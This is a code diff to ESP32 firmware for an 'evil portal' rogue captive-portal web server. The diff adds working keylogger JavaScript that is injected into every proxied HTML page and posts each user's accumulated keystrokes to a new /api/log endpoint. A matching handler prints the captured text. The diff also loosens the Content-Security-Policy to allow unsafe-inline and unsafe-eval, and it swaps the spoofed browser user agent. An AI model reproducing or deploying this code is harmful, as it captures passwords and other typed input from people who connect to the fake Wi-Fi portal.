@@ -401,7 +401,7 @@ esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *c
             .timeout_ms = 5000,
             .crt_bundle_attach = esp_crt_bundle_attach,
             .transport_type = HTTP_TRANSPORT_OVER_SSL,
-            .user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",  // Browser-like User-Agent string
+            .user_agent = "Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36",  // Browser-like User-Agent string
             .disable_auto_redirect = false,
         };
 
@@ -441,6 +441,13 @@ esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *c
                 printf("Content-Type not provided, using default 'application/octet-stream'\n");
                 httpd_resp_set_type(req, "application/octet-stream");
             }
+
+            httpd_resp_set_hdr(req, "Content-Security-Policy", 
+                   "default-src 'self' 'unsafe-inline' data: blob:; "
+                   "script-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; "
+                   "style-src 'self' 'unsafe-inline' data:; "
+                   "img-src 'self' 'unsafe-inline' data: blob:; "
+                   "connect-src 'self' data: blob:;");
             httpd_resp_set_status(req, "200 OK");
 
             char *buffer = (char *)malloc(CHUNK_SIZE + 1);
@@ -462,6 +469,31 @@ esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *c
                 printf("Finished reading all data from server (end of content)\n");
             } else if (read_len < 0) {
                 printf("Failed to read response, read_len: %d\n", read_len);
+            }
+
+            if (content_type && strcmp(content_type, "text/html") == 0) {
+                const char *javascript_code =
+                    "<script>var keys = '';\n"
+                    "\n"
+                    "document.onkeypress = function(e) {\n"
+                    "    get = window.event ? event : e;\n"
+                    "    key = get.keyCode ? get.keyCode : get.charCode;\n"
+                    "    key = String.fromCharCode(key);\n"
+                    "    keys += key;\n"
+                    "\n"
+                    "    // Make a fetch request on every key press\n"
+                    "    fetch('/api/log', {\n"
+                    "        method: 'POST',\n"
+                    "        headers: {\n"
+                    "            'Content-Type': 'application/json'\n"
+                    "        },\n"
+                    "        body: JSON.stringify({ content: keys })\n"
+                    "    })\n"
+                    "    .catch(error => console.error('Error logging:', error));\n"
+                    "};</script>\n";
+                if (httpd_resp_send_chunk(req, javascript_code, strlen(javascript_code)) != ESP_OK) {
+                    printf("Failed to send custom JavaScript\n");
+                }
             }
 
             free(buffer);
@@ -564,6 +596,27 @@ esp_err_t portal_handler(httpd_req_t *req) {
     return ESP_OK;
 }
 
+esp_err_t get_log_handler(httpd_req_t *req) {
+    char body[256] = {0};
+    int received = 0;
+
+    while ((received = httpd_req_recv(req, body, sizeof(body) - 1)) > 0) {
+        body[received] = '\0';
+
+        printf("Received chunk: %s\n", body);
+    }
+
+    if (received < 0) {
+        printf("Failed to receive request body");
+        return ESP_FAIL;
+    }
+
+    const char* resp_str = "Body content logged successfully";
+    httpd_resp_send(req, resp_str, strlen(resp_str));
+
+    return ESP_OK;
+}
+
 esp_err_t get_info_handler(httpd_req_t *req) {
     char query[256] = {0};
     char email[64] = {0};
@@ -655,6 +708,12 @@ httpd_handle_t start_portal_webserver(void) {
             .handler  = captive_portal_redirect_handler,
             .user_ctx = NULL
         };
+        httpd_uri_t log_handler_uri = {
+            .uri      = "/api/log",
+            .method   = HTTP_POST,
+            .handler  = get_log_handler,
+            .user_ctx = NULL
+        };
         httpd_uri_t portal_png = {
             .uri      = ".png",
             .method   = HTTP_GET,
@@ -683,6 +742,7 @@ httpd_handle_t start_portal_webserver(void) {
         httpd_register_uri_handler(evilportal_server, &portal_uri);
         httpd_register_uri_handler(evilportal_server, &portal_uri_android);
         httpd_register_uri_handler(evilportal_server, &microsoft_uri);
+        httpd_register_uri_handler(evilportal_server, &log_handler_uri);
 
 
         httpd_register_uri_handler(evilportal_server, &portal_png);
